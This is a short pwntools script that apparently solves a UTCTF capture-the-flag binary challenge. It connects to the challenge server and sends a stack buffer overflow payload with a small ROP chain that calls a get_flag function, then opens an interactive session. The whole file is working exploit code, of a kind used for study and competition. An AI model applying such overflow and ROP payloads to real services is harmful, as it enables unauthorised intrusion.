#!/usr/bin/python
from pwn import *

#r = process('./pwnable')
r = remote("binary.utctf.live", 9002)

pop_rdi_ret = 0x400693
get_flag = 0x4005ea

payload = "A"*120
payload += p64(pop_rdi_ret)
payload += p64(0xdeadbeef)
payload += p64(get_flag)
r.send(payload)
r.interactive()
